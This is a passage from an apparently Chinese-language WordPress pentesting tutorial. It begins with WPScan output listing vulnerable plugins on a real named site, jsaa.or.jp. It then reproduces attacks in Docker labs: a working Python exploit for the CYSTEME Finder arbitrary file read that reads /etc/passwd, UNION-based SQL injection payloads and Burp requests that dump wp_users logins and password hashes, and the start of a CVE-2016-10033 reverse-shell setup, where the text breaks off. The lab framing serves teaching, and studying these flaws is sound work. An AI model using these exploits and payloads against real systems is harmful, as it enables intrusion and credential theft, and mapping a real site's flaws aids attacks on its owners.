 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13865
 |      - https://www.softwaresecured.com/elementor-page-builder-stored-xss/
 |
 | [!] Title: Elementor < 2.9.14 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 2.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/7dfde62f-f167-403b-8b23-f4ac845ac04d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15020
 |      - http://hidden-one.co.in/2020/07/07/cve-2020-1020-stored-xss-on-elementor-wordpress-plugin/
 |
 | [!] Title: Elementor < 3.0.14 - SVG Upload Allowed by Default
 |     Fixed in: 3.0.14
 |     References:
 |      - https://wpscan.com/vulnerability/5c5f44e1-c00b-4a90-a581-ef06765b7f66
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36171
 |
 | [!] Title: Elementor Page Builder < 2.8.4 - Cross-Site Scripting (XSS)
 |     Fixed in: 2.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/6503bdfa-013a-4172-8e3f-ea99444f1eca
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7109
 |      - https://github.com/elementor/elementor/commit/a31dcf4ee1d18b58feef3e59fabb79976c11d0b8
 |
 | [!] Title: Elementor < 3.1.4 - Authenticated Stored Cross-Site Scripting (XSS) in Column Element
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/9647f516-b130-4cc8-85fb-2e69b034ced0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24201
 |      - https://www.wordfence.com/blog/2021/03/cross-site-scripting-vulnerabilities-in-elementor-impact-over-7-million-sites/
 |
 | [!] Title: Elementor < 3.1.4 - Authenticated Stored Cross-Site Scripting (XSS) in Heading Widget
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/b72bd13d-c8e2-4347-b009-542fc0fe21bb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24202
 |      - https://www.wordfence.com/blog/2021/03/cross-site-scripting-vulnerabilities-in-elementor-impact-over-7-million-sites/
 |
 | [!] Title: Elementor < 3.1.4 - Authenticated Stored Cross-Site Scripting (XSS) in Divider Widget
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/aa152ad0-5b3d-4d1f-88f4-6899a546e72e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24203
 |      - https://www.wordfence.com/blog/2021/03/cross-site-scripting-vulnerabilities-in-elementor-impact-over-7-million-sites/
 |
 | [!] Title: Elementor < 3.1.4 - Authenticated Stored Cross-Site Scripting (XSS) in Accordion Widget
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/772e172f-c8b4-4a6a-9eb9-9663295cfedf
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24204
 |      - https://www.wordfence.com/blog/2021/03/cross-site-scripting-vulnerabilities-in-elementor-impact-over-7-million-sites/
 |
 | [!] Title: Elementor < 3.1.4 - Authenticated Stored Cross-Site Scripting (XSS) in Icon Box Widget
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/ef23df6d-e265-44f6-bb94-1005b16d34d9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24205
 |      - https://www.wordfence.com/blog/2021/03/cross-site-scripting-vulnerabilities-in-elementor-impact-over-7-million-sites/
 |
 | [!] Title: Elementor < 3.1.4 - Authenticated Stored Cross-Site Scripting (XSS) in Image Box Widget
 |     Fixed in: 3.1.4
 |     References:
 |      - https://wpscan.com/vulnerability/2f66efd9-7d55-4f33-9109-3cb583a0c309
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24206
 |      - https://www.wordfence.com/blog/2021/03/cross-site-scripting-vulnerabilities-in-elementor-impact-over-7-million-sites/
 |
 | [!] Title: Elementor < 3.4.8 - DOM Cross-Site-Scripting
 |     Fixed in: 3.4.8
 |     References:
 |      - https://wpscan.com/vulnerability/fbed0daa-007d-4f91-8d87-4bca7781de2d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24891
 |      - https://www.jbelamor.com/xss-elementor-lightox.html
 |
 | [!] Title: Elementor < 3.5.6 - DOM Reflected Cross-Site Scripting
 |     Fixed in: 3.5.6
 |     References:
 |      - https://wpscan.com/vulnerability/9758570b-4729-4eef-ad52-b6e922f536d6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29455
 |      - https://rotem-bar.com/hacking-65-million-websites-greater-cve-2022-29455-elementor
 |
 | [!] Title: Elementor Website Builder < 3.12.2 - Admin+ SQLi
 |     Fixed in: 3.12.2
 |     References:
 |      - https://wpscan.com/vulnerability/a875836d-77f4-4306-b275-2b60efff1493
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0329
 |
 | [!] Title: Elementor Website Builder < 3.13.2 - Missing Authorization
 |     Fixed in: 3.13.2
 |     Reference: https://wpscan.com/vulnerability/0b68091c-6a05-4f81-a718-6ec139df2e96
 |
 | [!] Title: Elementor < 3.5.5 - Iframe Injection
 |     Fixed in: 3.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/8273357e-f9e1-44bc-8082-8faab838eda7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4953
 |      - https://github.com/elementor/elementor/commit/292fc49e0f979bd52d838f0326d1faaebfa59f5e
 |
 | [!] Title: Elementor Website Builder < 3.16.5 - Authenticated (Contributor+) Stored Cross-Site Scripting via get_inline_svg()
 |     Fixed in: 3.16.5
 |     References:
 |      - https://wpscan.com/vulnerability/62b53acf-6551-4ea7-8727-039a3c9ba7ce
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47505
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b44ef21f-464e-487a-ba5a-fe889e4c488c
 |
 | [!] Title: Elementor Website Builder < 3.16.5 - Missing Authorization to Arbitrary Attachment Read
 |     Fixed in: 3.16.5
 |     References:
 |      - https://wpscan.com/vulnerability/e60f0f7e-4c3b-4107-803a-8e03526859ed
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47504
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c873c76a-144e-4945-8fa2-c9ffe0e3c061
 |
 | [!] Title: Elementor < 3.18.2 - Contributor+ Arbitrary File Upload to RCE via Template Import
 |     Fixed in: 3.18.2
 |     References:
 |      - https://wpscan.com/vulnerability/a6b3b14c-f06b-4506-9b88-854f155ebca9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-48777
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5b6d0a38-ac28-41c9-9da1-b30b3657b463
 |
 | [!] Title: Elementor < 3.19.1 - Authenticated(Contributor+) Arbitrary File Deletion and PHAR Deserialization
 |     Fixed in: 3.19.1
 |     References:
 |      - https://wpscan.com/vulnerability/4d7dfcc6-8c32-4e0d-b3bb-7e2685916e2b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24934
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4915b769-9499-40ac-835e-279e3a910558
 |
 | [!] Title: Elementor Website Builder – More than Just a Page Builder < 3.19.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via get_image_alt
 |     Fixed in: 3.19.0
 |     References:
 |      - https://wpscan.com/vulnerability/57af46d9-9a26-4085-9829-e0add7893332
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0506
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4473d3f6-e324-40f5-b92b-167f76b17332
 |
 | [!] Title: Elementor Website Builder < 3.20.3 - Contributor+ DOM Stored XSS
 |     Fixed in: 3.20.3
 |     References:
 |      - https://wpscan.com/vulnerability/22e8d017-79f5-40c8-8a2c-e0ee42ba80c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2117
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c8d7448a-b8a6-4b0b-92df-a15272fc56bf
 |
 | [!] Title: Elementor Website Builder < 3.21.6 - Contributor+ DOM Stored XSS
 |     Fixed in: 3.21.6
 |     References:
 |      - https://wpscan.com/vulnerability/8b8f30d6-bd11-4155-bfd2-3ac15248382b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4619
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c7e1028e-e04b-46c4-b574-889d9fc1069d
 |
 | [!] Title: Elementor Website Builder < 3.22.2 - Contributor+ Arbitrary SVG Download
 |     Fixed in: 3.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/e6d56be1-9a2a-426f-88ca-1ffa773622c1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37437
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f11bc707-2465-4b64-945a-c0db6e9043dd
 |
 | [!] Title: Elementor Website Builder – More than Just a Page Builder < 3.24.0 - Authenticated (Contributor+) Stored Cross-Site Scripting in the URL Parameter in Multiple Widgets
 |     Fixed in: 3.24.0
 |     References:
 |      - https://wpscan.com/vulnerability/5200943b-5e07-4342-a090-f78435e30d30
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5416
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a99a64f7-1ea8-4de6-b24f-1f69bf25c1f5
 |
 | [!] Title: Elementor < 3.24.6 - Contributor+ Information Exposure via get_image_alt
 |     Fixed in: 3.24.6
 |     References:
 |      - https://wpscan.com/vulnerability/dce5ad0c-3ce9-498f-b0f7-8dfd6ee82e40
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6757
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/96fa9ed7-6c13-4356-8a25-8a309be2b0e9
 |
 | Version: 1.2.3 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - https://jsaa.or.jp/wp/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=1.2.3
 |  - https://jsaa.or.jp/wp/wp-content/plugins/elementor/assets/css/animations.min.css?ver=1.2.3
 |  - https://jsaa.or.jp/wp/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=1.2.3
 |  - https://jsaa.or.jp/wp/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=1.2.3
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - https://jsaa.or.jp/wp/wp-content/plugins/elementor/readme.txt

[+] highlight-search-terms
 | Location: https://jsaa.or.jp/wp/wp-content/plugins/highlight-search-terms/
 | Last Updated: 2024-04-04T23:53:00.000Z
 | [!] The version is out of date, the latest version is 1.8.3
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Comment (Passive Detection)
 |
 | Version: 1.4.3 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - https://jsaa.or.jp/, Match: 'Highlight Search Terms 1.4.3'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - https://jsaa.or.jp/wp/wp-content/plugins/highlight-search-terms/hlst-extend.min.js?ver=1.4.3
 |  Readme - Stable Tag (Aggressive Detection)
 |   - https://jsaa.or.jp/wp/wp-content/plugins/highlight-search-terms/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - https://jsaa.or.jp/wp/wp-content/plugins/highlight-search-terms/readme.txt

[+] menu-image
 | Location: https://jsaa.or.jp/wp/wp-content/plugins/menu-image/
 | Last Updated: 2023-12-27T20:45:00.000Z
 | [!] The version is out of date, the latest version is 3.11
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | [!] 4 vulnerabilities identified:
 |
 | [!] Title: Unauthorised AJAX Calls via Freemius
 |     Fixed in: 3.0.6
 |     Reference: https://wpscan.com/vulnerability/6dae6dca-7474-4008-9fe5-4c62b9f12d0a
 |
 | [!] Title: Menu Image, Icons made easy < 3.0.8 - Subscriber+ Stored Cross-Site Scripting
 |     Fixed in: 3.0.8
 |     References:
 |      - https://wpscan.com/vulnerability/612f9273-acc8-4be6-b372-33f1e687f54a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0450
 |
 | [!] Title: Freemius SDK < 2.5.10 - Reflected Cross-Site Scripting
 |     Fixed in: 3.10
 |     References:
 |      - https://wpscan.com/vulnerability/58ab5352-d783-431a-b0a5-382381cc13fd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999
 |
 | [!] Title: Menu Image, Icons made easy < 3.11 - Admin+ Stored XSS
 |     Fixed in: 3.11
 |     References:
 |      - https://wpscan.com/vulnerability/469e3568-cb7e-498e-9458-e7952b2ff31f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-50826
 |      - https://patchstack.com/database/vulnerability/menu-image/wordpress-menu-image-icons-made-easy-plugin-3-10-cross-site-scripting-xss-vulnerability
 |
 | Version: 2.7.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://jsaa.or.jp/wp/wp-content/plugins/menu-image/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://jsaa.or.jp/wp/wp-content/plugins/menu-image/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:01:55 <==================================================================> (137 / 137) 100.00% Time: 00:01:55

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 7
 | Requests Remaining: 16

[+] Finished: Tue Nov  5 14:18:02 2024
[+] Requests Done: 185
[+] Cached Requests: 6
[+] Data Sent: 51.789 KB
[+] Data Received: 490.626 KB
[+] Memory used: 293.613 MB
[+] Elapsed time: 00:04:19
```



#### wpscan插件

https://wordpress.org/plugins/wpscan/

![image-20241105121022241](https://image.201068.xyz/assets/11.Wordpress/image-20241105121022241.png)

## 06.漏洞复现 

### wordpress 任意文件读取漏洞

> CVE-2019-6715

`WordPress CYSTEME Finder 1.3` **任意文件读取漏洞**，它是一个用于文件管理和目录浏览的插件，

但由于其安全设计缺陷，攻击者可以在不登录的情况下利用该漏洞访问服务器上的任意文件。

https://blog.csdn.net/weixin_42323041/article/details/115011873

https://www.exploit-db.com/exploits/49317

#### 启动靶场

```bash
docker pull medicean/vulapps:w_wordpress_3
docker run -d -p 6082:80 medicean/vulapps:w_wordpress_3
```

![image-20241105145504856](https://image.201068.xyz/assets/11.Wordpress/image-20241105145504856.png)

#### 访问

http://192.168.70.4:6082

![image-20241105151015501](https://image.201068.xyz/assets/11.Wordpress/image-20241105151015501.png)

#### exp.py

https://www.exploit-db.com/exploits/40295

攻击脚本，修改exp脚本中的服务器地址，`host`改为自己靶机的地址。

![image-20241105165139025](https://image.201068.xyz/assets/11.Wordpress/image-20241105165139025.png)

```bash
#!/usr/bin/evn python
# -*-:coding:utf-8 -*-
# Source: https://www.exploit-db.com/exploits/40295/

import httplib
from json import loads

TARGET_HOST = "192.168.70.4:6062"


def common(path):
    global TARGET_HOST
    conn = httplib.HTTPConnection(TARGET_HOST)
    conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=open&init=1&tree=1")
    return loads(conn.getresponse().read())


def ls(path):
    try:
        data = common(path)["files"]
        print
        print "Total files: %d\n" % len(data)
        for counter in range(len(data)):
            if data[counter]["mime"]:
                print data[counter]["mime"], ":",
            else:
                print "Unknown type", ":",
            print data[counter]["name"]
        print "\n"
    except KeyError:
        print "没有这个文件夹 / No such FOLDER\n"


def cat(raw_path):
    global TARGET_HOST
    path = ""
    split_path = raw_path.split("/")
    filename = split_path[-1]
    for counter in range(len(split_path) - 1):
        path += "/"
        path += split_path[counter]
    try:
        data = common(path)["files"]
        print
        for counter in range(len(data)):
            if data[counter]["name"] == filename:
                hashstr = data[counter]["hash"]
                conn = httplib.HTTPConnection(TARGET_HOST)
                conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=file&target=" + hashstr + "&download=1")
                print conn.getresponse().read()
    except KeyError:
        print "没有这个文件夹 / No such FOLDER\n"


print "用法示例：ls /etc , cat /etc/passwd。请使用绝对路径。键入'exit'退出。\
    \ne.g.: ls /etc , cat /etc/passwd. Please use ABSOLUTE PATH. Type \
    exit to leave. \n"

while True:
    raw_instruction = raw_input()
    instruction = raw_instruction.split()
    if instruction[0] == "exit":
        exit()
    if len(instruction) > 1:
        if instruction[0] == "ls":
            ls(instruction[1])
        elif instruction[0] == "cat":
            cat(instruction[1])
        else:
            print "未定义相关操作 / Undefined actions"
    else:
            print "缺少参数 / Missing Parameters"

```



#### 运行脚本

根据脚本地址运行命令查看效果

```bash
python2 exp.py

ls /etc
cat /etc/passwd
```

![image-20241105165703570](https://image.201068.xyz/assets/11.Wordpress/image-20241105165703570.png)

![image-20241105165536342](https://image.201068.xyz/assets/11.Wordpress/image-20241105165536342.png)

#### 分析exp代码

根据exp代码，找到请求地址。

![image-20241105165754468](https://image.201068.xyz/assets/11.Wordpress/image-20241105165754468.png)

```bash
conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=open&init=1&tree=1")
```

![image-20241105165825410](https://image.201068.xyz/assets/11.Wordpress/image-20241105165825410.png)

```bash
conn.request("GET", "/wp-content/plugins/cysteme-finder/php/connector.php?wphome=" + path + "&cmd=file&target=" + hashstr + "&download=1")
```

#### 泄露信息地址

http://192.168.70.4:6082/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/etc&cmd=open&init=1&tree=1

![image-20241105152905626](https://image.201068.xyz/assets/11.Wordpress/image-20241105152905626.png)

#### 获取hash值

根据泄露信息获取信息列表下hash值。

![image-20241105153230058](https://image.201068.xyz/assets/11.Wordpress/image-20241105153230058.png)

> /etc/passwd：l1_cGFzc3dk

![image-20241105153055783](https://image.201068.xyz/assets/11.Wordpress/image-20241105153055783.png)

> /etc/shadow：l1_c2hhZG93

#### 查看文件

根据泄露信息获取信息列表下hash值。

##### 格式

```bash
http://192.168.70.4:6082/wp-content/plugins/cysteme-finder/php/connector.php?wphome=目录&&cmd=file&target=文件hash值
&download=0
```

##### /etc/passwd

```bash
http://192.168.70.4:6082/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/etc&&cmd=file&target=l1_cGFzc3dk
&download=0
```

![image-20241105153531172](https://image.201068.xyz/assets/11.Wordpress/image-20241105153531172.png)

##### /etc/shadow

```bash
http://192.168.70.4:6082/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/etc&&cmd=file&target=l1_c2hhZG93
&download=0
```

![image-20241105153728608](https://image.201068.xyz/assets/11.Wordpress/image-20241105153728608.png)

无权限

#### 下载文件 

```bash
docker ps -s
docker cp 2c320b056eaf:/var/www/html /root/
```

![image-20241105152025245](https://image.201068.xyz/assets/11.Wordpress/image-20241105152025245.png)

#### 代码分析

根据路径找到文件，发现并没有登录验证。

> wp-content\plugins\cysteme-finder\php\connector.php

```bash
/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/etc&cmd=open&init=1&tree=1
```

![image-20241105152603288](https://image.201068.xyz/assets/11.Wordpress/image-20241105152603288.png)

```bash
<?php

$wphome = $_REQUEST['wphome'];
$wpurl = $_REQUEST['wpurl'];

error_reporting(0); // Set E_ALL for debuging

include_once dirname(__FILE__).DIRECTORY_SEPARATOR.'elFinderConnector.class.php';
include_once dirname(__FILE__).DIRECTORY_SEPARATOR.'elFinder.class.php';
include_once dirname(__FILE__).DIRECTORY_SEPARATOR.'elFinderVolumeDriver.class.php';
include_once dirname(__FILE__).DIRECTORY_SEPARATOR.'elFinderVolumeLocalFileSystem.class.php';

$opts = array('debug' => false);

$opts['roots'][] =
(
	array(
		'driver'        => 'LocalFileSystem',  
		'path'          => $wphome,
		'URL'           => $wpurl,
		'alias'         => "Fichiers du site",
        'quarantine'    => '.tmp'
	)
);
$connector = new elFinderConnector(new elFinder($opts));
$connector->run();
?>

```



### wordpress sql注入漏洞

`WordPress Double Opt-In for Download` 插件 2.0.9 版本中, `public/class-doifd.php` 文件中 `populate_download_edit_form` 函数中 `id` 参数未经过滤，直接拼接SQL 语句，导致 SQL 注入漏洞。

#### 启动靶场

```bash
docker pull medicean/vulapps:w_wordpress_1
docker run -d -p 6083:80 medicean/vulapps:w_wordpress_1
```

![image-20241105154141764](https://image.201068.xyz/assets/11.Wordpress/image-20241105154141764.png)

#### 访问

http://192.168.70.4:6083

![image-20241105154210847](https://image.201068.xyz/assets/11.Wordpress/image-20241105154210847.png)

#### 用账号密码登录

http://192.168.70.4:6083/wp-login.php

| 类型       | 用户名 | 密码     |
| ---------- | ------ | -------- |
| Mysql      | root   | root     |
| /wp-admin/ | admin  | admin123 |

![image-20241105154347507](https://image.201068.xyz/assets/11.Wordpress/image-20241105154347507.png)

#### 获取cookie

![image-20241105154507181](https://image.201068.xyz/assets/11.Wordpress/image-20241105154507181.png)

```bash
wordpress_7190a056b1cc7873906429f8cddddb02=admin%7C1732002252%7CfbYDZeETioZFLstg3UZ7ukpRKeBB2ReH1oUE82o0eHq%7Ca7de874c327c3c500b06846829da6c8b46a10b589d64708e86d280e5ee505239
```

#### poc.py

```bash
#!/usr/bin/evn python
# -*-:coding:utf-8 -*-
# WordPress Double Opt-In for Download Plugin 2.0.9 - SQL Injection
# http://www.bugscan.net/source/plugin/4474/template/
# https://www.exploit-db.com/exploits/39896/


def assign(service, arg):
    if service == fingerprint.wordpress:
        return True, arg


def audit(arg):
    url = "%s/wp-admin/admin-ajax.php?action=populate_download_edit_form" % arg
    payload = "id=0 UNION SELECT md5(123),2,4,5,6,7,8 FROM wp_users WHERE ID=1"
    # 本插件需要登录，测试时添加的 Cookie 信息
    header = {
        "Cookie": "wordpress_7190a056b1cc7873906429f8cddddb02=admin%7C1732002252%7CfbYDZeETioZFLstg3UZ7ukpRKeBB2ReH1oUE82o0eHq%7Ca7de874c327c3c500b06846829da6c8b46a10b589d64708e86d280e5ee505239;"
    }
    code, head, html, redir, log = hackhttp.http(url, post=payload, headers=header)
    # code, head, html, redir, log = hackhttp.http(url, post=payload)
    if code == 200 and "202cb962ac59075b964b07152d234b70" in html:
        security_hole("%s" % url, log=log)

if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.wordpress, "http://192.168.70.4:6083")[1])
```

#### 构造payload请求

```bash
id=100 union select md5(123),2,4,5,6,7,8 from wp_users where id=1;
id=100 UNION SELECT user_login,user_pass,user_nicename,user_email,user_registered,7,8 FROM wp_users WHERE ID=1;
```

#### sql注入

##### hackbar

```bash
http://192.168.70.4:6083/wp-admin/admin-ajax.php?action=populate_download_edit_form

id=100 union select md5(123),2,4,5,6,7,8 from wp_users where id=1;
```

![image-20241105154917999](https://image.201068.xyz/assets/11.Wordpress/image-20241105154917999.png)

```bash
http://192.168.70.4:6083/wp-admin/admin-ajax.php?action=populate_download_edit_form

id=100 UNION SELECT user_login,user_pass,user_nicename,user_email,user_registered,7,8 FROM wp_users WHERE ID=1;
```

![image-20241105155102620](https://image.201068.xyz/assets/11.Wordpress/image-20241105155102620.png)

##### burpsute

![image-20241105155553476](https://image.201068.xyz/assets/11.Wordpress/image-20241105155553476.png)

```bash
POST /wp-admin/admin-ajax.php?action=populate_download_edit_form HTTP/1.1
Host: 192.168.70.4:6083
Content-Length: 111
Cache-Control: max-age=0
Origin: http://192.168.70.4:6083
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.4:6083/wp-admin/admin-ajax.php?action=populate_download_edit_form
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: wordpress_7190a056b1cc7873906429f8cddddb02=admin%7C1732002252%7CfbYDZeETioZFLstg3UZ7ukpRKeBB2ReH1oUE82o0eHq%7Ca7de874c327c3c500b06846829da6c8b46a10b589d64708e86d280e5ee505239
Connection: keep-alive

id=100 UNION SELECT user_login,user_pass,user_nicename,user_email,user_registered,7,8 FROM wp_users WHERE ID=1;
```

#### 代码下载

```bash
docker ps -s
docker cp 304174449fd6:/var/www/html /root/w_wordpress_1/
```

![image-20241105155817556](https://image.201068.xyz/assets/11.Wordpress/image-20241105155817556.png)

![image-20241105160214222](https://image.201068.xyz/assets/11.Wordpress/image-20241105160214222.png)

#### 代码分析

`WordPress Double Opt-In for Download` 插件 2.0.9 版本中, `public/class-doifd.php` 文件中 `populate_download_edit_form` 函数中 `id` 参数未经过滤，直接拼接 SQL 语句，导致 SQL 注入漏洞。

> wp-content\plugins\double-opt-in-for-download\public\class-doifd.php

![image-20241105160401263](https://image.201068.xyz/assets/11.Wordpress/image-20241105160401263.png)

```bash
public function populate_download_edit_form() {

        global $wpdb; // this is how you get access to the database

        if( isset( $_POST[ 'id' ] ) ) {

            $value = $_POST[ 'id' ];

            $download = $wpdb->get_row( "SELECT * FROM {$wpdb->prefix}doifd_lab_downloads WHERE doifd_download_id = $value", ARRAY_A );
        }
        echo json_encode( $download );
        die(); // this is required to terminate immediately and return a proper response
    }
```



### wordpress RCE漏洞

> CVE-2016-10033

https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html

#### 启动靶场

##### docker-compose.yml

```bash
version: '2'
services:
 web:
   image: vulhub/wordpress:4.6
   depends_on:
    - mysql
   environment: 
    - WORDPRESS_DB_HOST=mysql:3306
    - WORDPRESS_DB_USER=root
    - WORDPRESS_DB_PASSWORD=root
    - WORDPRESS_DB_NAME=wordpress
   ports:
    - "6081:80"
 mysql:
   image: mysql:5
   environment: 
    - MYSQL_ROOT_PASSWORD=root

```

##### 部署

```bash
cd /root/tools/wordpress/rce/
docker-compose build
docker-compose up -d
```

![image-20241105172040875](https://image.201068.xyz/assets/11.Wordpress/image-20241105172040875.png)

#### 访问

http://192.168.70.4:6081

![image-20241105172107508](https://image.201068.xyz/assets/11.Wordpress/image-20241105172107508.png)

#### 安装wordpress

![image-20241105172159684](https://image.201068.xyz/assets/11.Wordpress/image-20241105172159684.png)

![image-20241105172215234](https://image.201068.xyz/assets/11.Wordpress/image-20241105172215234.png)

#### 点击忘记密码


然后到登录页面点击忘记密码。

![image-20241105172456707](https://image.201068.xyz/assets/11.Wordpress/image-20241105172456707.png)

#### burp抓包

打开BP工具，**点击获取新密码**，获取抓包信息。

![image-20241105172639336](https://image.201068.xyz/assets/11.Wordpress/image-20241105172639336.png)

![image-20241105172733369](https://image.201068.xyz/assets/11.Wordpress/image-20241105172733369.png)

```bash
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: 192.168.70.4:6081
Content-Length: 85
Cache-Control: max-age=0
Origin: http://192.168.70.4:6081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.4:6081/wp-login.php?action=lostpassword
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%228d70666ed7af21dfe4c17ab54c6e82e7%22%2C%22first_id%22%3A%22191078d1ccb607-079cc2afb934768-26001e51-1327104-191078d1ccc10a5%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%2C%22%24latest_search_keyword%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%2C%22%24latest_referrer%22%3A%22url%E7%9A%84domain%E8%A7%A3%E6%9E%90%E5%A4%B1%E8%B4%A5%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxMDc4ZDFjY2I2MDctMDc5Y2MyYWZiOTM0NzY4LTI2MDAxZTUxLTEzMjcxMDQtMTkxMDc4ZDFjY2MxMGE1IiwiJGlkZW50aXR5X2xvZ2luX2lkIjoiOGQ3MDY2NmVkN2FmMjFkZmU0YzE3YWI1NGM2ZTgyZTcifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%228d70666ed7af21dfe4c17ab54c6e82e7%22%7D%2C%22%24device_id%22%3A%22191078d1ccb607-079cc2afb934768-26001e51-1327104-191078d1ccc10a5%22%7D; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_7190a056b1cc7873906429f8cddddb02=admin%7C1732002252%7CfbYDZeETioZFLstg3UZ7ukpRKeBB2ReH1oUE82o0eHq%7C537b96a73a75409acb793ccd24ea9ec6ec0d9e79e3f8cb951391efc4f2b4ea78; wp-settings-time-1=1730792806
Connection: keep-alive

user_login=admin&redirect_to=&wp-submit=%E8%8E%B7%E5%8F%96%E6%96%B0%E5%AF%86%E7%A0%81
```



#### 反弹shell

 打开攻击机kali，创建一个目录并制作反弹shell，命名`1.txt`。文件内容：

```bash
mkdir /root/pwnscriptum
